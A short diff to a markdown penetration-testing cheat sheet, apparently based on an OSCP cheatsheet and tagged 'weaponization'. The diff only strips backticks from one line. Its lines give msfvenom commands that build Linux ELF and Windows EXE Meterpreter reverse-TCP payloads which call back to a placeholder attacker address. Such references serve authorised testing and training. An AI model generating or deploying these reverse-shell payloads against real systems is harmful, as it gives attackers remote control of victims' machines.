@@ -5,7 +5,7 @@ https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md
 - tactics: weaponization
 
 ## Linux ELF binary
-- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`
+- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
 
 ## Windows EXE binary 
 - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`
